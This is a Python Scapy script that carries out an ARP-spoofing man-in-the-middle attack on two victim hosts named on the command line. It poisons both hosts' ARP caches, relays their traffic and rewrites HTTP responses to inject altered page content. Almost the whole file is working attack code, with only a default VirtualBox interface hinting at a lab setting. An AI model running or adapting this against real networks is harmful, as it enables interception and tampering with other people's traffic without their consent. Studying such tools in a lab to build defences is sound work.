#!/usr/bin/env python
from scapy.all import *
import sys
import time
import threading


# stopping icmp not reachable responses to the victim's machine in order to prevent connection break
# sysctl -w net.ipv4.conf.vboxnet0.send_redirects=0

# default interface for testing
interface = 'vboxnet0'

# function for finding mac address of the victims
def find_mac(ip):
    ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),timeout=2 ,retry=-2,iface=interface)
    print 'answer form ip {0} and mac {1} to ip {2} and mac {3}'.format(ans[ARP].psrc,ans[ARP].hwsrc,ans[ARP].pdst,ans[ARP].hwdst)
    return ans[ARP].hwsrc
    pass

# function for arp poison
def arp_poison(pdst,hwdst,psrc):

    # creating a arp packet request packet
    p = Ether(dst=hwdst) / ARP(hwdst='ff:ff:ff:ff:ff:ff',pdst=pdst, psrc=psrc,op='who-has')
    sendp(p, iface=interface)

    print 'arp request for poisioning ip = {0} with mac = {1} for ip = {2} with mac = {3}'.format(p[ARP].pdst, p.dst, p[ARP].psrc,p.src)

    print 'actual sent packet {0} \n\n'.format(repr(p))


# callback function for every captured arp packet
def arp(packet):
    print 'arp packet came'
    if packet[ARP].op == 1:
        print 'arp request for = {0} from mac = {1} and ip = {2} '.format(packet[ARP].pdst,packet[ARP].hwsrc,packet[ARP].psrc)

        # creating a arp packet using contents of the received packet
        p = Ether(dst=packet[ARP].hwsrc)/ARP(hwdst=packet[ARP].hwsrc,pdst=packet[ARP].psrc,psrc=packet[ARP].pdst,op='is-at')
        sendp(p, iface=interface)

        print 'arp reply from ip = {0} and mac = {1} to ip = {2} and mac = {3}'.format(p[ARP].psrc,p.src,p[ARP].pdst,p.dst)

        print 'actual request {0} \n'.format(repr(packet))
        print 'actual reply {0} \n\n'.format(repr(p))


def http(packet):
    print 'http packet came'
    if packet.src == mac1:
        p = Ether(dst = mac2)/packet[IP]
    elif packet.src == mac2:
        p = Ether(dst = mac1)/packet[IP]

    sendp(p,iface=interface)
    print 'actual request {0} \n'.format(repr(packet))
    print 'actual reply {0} \n\n'.format(repr(p))
    pass


def http_attack(packet):
    print 'http packet came'
    if packet.src == mac1:
        p = Ether(dst=mac2) / packet.payload
        if packet[TCP].flags == 'PA' and packet[TCP].sport == 80 or packet[TCP].payload.__contains__('world!'):
            p[TCP].payload = Raw(load = '''HTTP/1.1 200 OK
Date: Fri, 22 Sep 2017 16:37:29 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9
Last-Modified: Thu, 24 Aug 2017 10:00:30 GMT
ETag: "d-5577ce6052efb"
Accept-Ranges: bytes
Content-Length: 13
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8\n\nbye o world!''')
            del p[IP].chksum
            del p[IP].len
            del p[TCP].chksum
            p =  p.__class__(str(p))
            print 'malicious {0} \n'.format(repr(p))

    elif packet.src == mac2:
        p = Ether(dst=mac1) / packet[IP]
        if packet[TCP].flags == 'PA' and packet[TCP].sport == 80 and packet[TCP].payload.__contains__('hello world'):
            p[TCP].payload = Raw(load='''HTTP/1.1 200 OK
            Date: Fri, 22 Sep 2017 16:37:29 GMT
            Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9
            Last-Modified: Thu, 24 Aug 2017 10:00:30 GMT
            ETag: "d-5577ce6052efb"
            Accept-Ranges: bytes
            Content-Length: 13
            Keep-Alive: timeout=5, max=100
            Connection: Keep-Alive
            Content-Type: text/html; charset=UTF-8\n\nbye o world!''')
            del p[IP].chksum
            del p[IP].len
            del p[TCP].chksum
            p = p.__class__(str(p))
            print 'malicious {0} \n'.format(repr(p))


    sendp(p,iface=interface)
    print 'actual request {0} \n'.format(repr(packet))
    print 'actual reply {0} \n\n'.format(repr(p))
    pass


def dns(packet):
    print 'dns packet came'
    pass

# callback function for sniffed packets
def reply(packet):

    # type value in a fragment for arp is 0x806
    if hex(packet.type) == '0x806':
        arp(packet)

    # type value in a fragment for arp is 0x800
    elif hex(packet.type) == '0x800':

        # protocol value for tcp is 6
        if packet[IP].proto == 6:
            if packet[TCP].dport == 80  or packet[TCP].sport == 80:
                http_attack(packet)

        # protocol value for udp is 17
        elif packet[IP].proto == 17:
            if packet[UDP].dport == 53:
                dns(packet)
            pass

# function for continuously poisoning arp cache of victim's machine
def cont_attack():
    # poisoning arp caches of the victim's machine
    arp_poison(ip1, mac1, ip2)
    arp_poison(ip2, mac2, ip1)


if len(sys.argv)<=3:
    print('Arguments : interface  , victim 1 IP , victim 2 IP')
    exit(1)
else:
    # extracting interface and victim's ip address from cmd parameters
    # interface to be used in attack , ip1 ,ip2 ip addresses of victims respectively
    interface = sys.argv[1]
    ip1 = sys.argv[2]
    ip2 = sys.argv[3]
    # finding mac address of the victims machine
    mac1 = find_mac(ip1)
    mac2 = find_mac(ip2)

    # poisoning arp caches of the victim's machine
    arp_poison(ip1,mac1,ip2)
    arp_poison(ip2,mac2,ip1)

    # continuously calling cont_attack function to keep poisoning their cache
    t = threading.Timer(30, cont_attack, args=[])
    t.start()

    # capturing all the packets related to the two victims based on their mac addresses
    # some packets are not ip based such as dhcp , arp packets
    sniff(prn=reply,filter=' ether src {0} or ether src {1}'.format(mac1,mac2),iface=interface,store=0)

